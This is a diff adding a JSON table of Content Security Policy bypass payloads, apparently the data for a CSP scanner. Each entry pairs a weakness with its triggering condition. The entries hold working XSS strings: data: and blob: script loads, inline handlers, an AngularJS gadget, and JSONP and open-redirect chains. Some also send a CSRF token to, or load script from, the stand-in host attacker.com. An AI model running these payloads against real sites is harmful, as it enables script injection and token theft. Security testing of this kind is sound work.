@@ -1,0 +1,96 @@
+{
+  "data_uri_script": {
+    "category": "scheme_abuse",
+    "severity": "critical",
+    "description": "data: URI in script-src allows direct script injection",
+    "payloads": [
+      "<script src='data:text/javascript,alert(document.domain)'></script>",
+      "<script src='data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='></script>"
+    ],
+    "condition": "data: in script-src effective sources"
+  },
+  "blob_uri_script": {
+    "category": "scheme_abuse",
+    "severity": "high",
+    "description": "blob: URI in script-src allows blob-based script creation",
+    "payloads": [
+      "var b=new Blob(['alert(document.domain)'],{type:'text/javascript'});var u=URL.createObjectURL(b);var s=document.createElement('script');s.src=u;document.body.appendChild(s);"
+    ],
+    "condition": "blob: in script-src effective sources AND existing JS execution"
+  },
+  "base_uri_injection": {
+    "category": "missing_directive",
+    "severity": "medium",
+    "description": "Missing base-uri allows <base> tag injection to redirect relative script loads",
+    "payloads": [
+      "<base href='https://attacker.com/'>"
+    ],
+    "condition": "No base-uri directive AND page uses relative script/resource paths"
+  },
+  "form_action_hijack": {
+    "category": "missing_directive",
+    "severity": "medium",
+    "description": "Missing form-action allows form submission to attacker-controlled endpoints",
+    "payloads": [
+      "<form action='https://attacker.com/steal'><input name='csrf_token' value='...'><button>Submit</button></form>",
+      "<form id='existing_form'></form><script>document.getElementById('existing_form').action='https://attacker.com/steal'</script>"
+    ],
+    "condition": "No form-action directive"
+  },
+  "object_src_flash": {
+    "category": "missing_directive",
+    "severity": "high",
+    "description": "Missing or permissive object-src allows Flash/plugin-based XSS",
+    "payloads": [
+      "<object data='https://attacker.com/evil.swf' type='application/x-shockwave-flash'><param name='AllowScriptAccess' value='always'></object>",
+      "<embed src='https://attacker.com/evil.swf' type='application/x-shockwave-flash' allowscriptaccess='always'>"
+    ],
+    "condition": "No object-src or object-src not 'none'"
+  },
+  "unsafe_inline_csp2_downgrade": {
+    "category": "browser_compat",
+    "severity": "medium",
+    "description": "unsafe-inline + nonce/hash: CSP2 browsers ignore nonce and honor unsafe-inline",
+    "payloads": [
+      "<script>alert(document.domain)</script>",
+      "<img src=x onerror=alert(document.domain)>"
+    ],
+    "condition": "'unsafe-inline' AND (nonce OR hash) in script-src"
+  },
+  "strict_dynamic_script_creation": {
+    "category": "trust_propagation",
+    "severity": "medium",
+    "description": "strict-dynamic allows trusted scripts to load additional scripts",
+    "payloads": [
+      "// From within a nonced/hashed script:\nvar s=document.createElement('script');s.src='https://attacker.com/evil.js';document.body.appendChild(s);"
+    ],
+    "condition": "'strict-dynamic' in script-src AND attacker can inject into trusted script"
+  },
+  "jsonp_callback": {
+    "category": "endpoint_abuse",
+    "severity": "high",
+    "description": "Whitelisted domain serves JSONP that reflects callback parameter as JS",
+    "payloads": [
+      "<script src='https://WHITELISTED/endpoint?callback=alert(document.domain)//'></script>"
+    ],
+    "condition": "Whitelisted domain in script-src has JSONP endpoint"
+  },
+  "cdn_script_gadget": {
+    "category": "endpoint_abuse",
+    "severity": "high",
+    "description": "Whitelisted CDN hosts a vulnerable JS library usable as a script gadget",
+    "payloads": [
+      "<script src='https://CDN/angular.js'></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>"
+    ],
+    "condition": "Whitelisted CDN in script-src hosts gadget-exploitable libraries"
+  },
+  "open_redirect_chain": {
+    "category": "redirect_abuse",
+    "severity": "high",
+    "description": "Whitelisted domain has an open redirect that can chain to JSONP/gadget on another whitelisted domain",
+    "payloads": [
+      "<script src='https://WHITELISTED/redirect?url=https://OTHER_WHITELISTED/jsonp?callback=alert(1)//'></script>"
+    ],
+    "condition": "Whitelisted domain has open redirect AND redirects to another whitelisted domain with JSONP"
+  }
+}
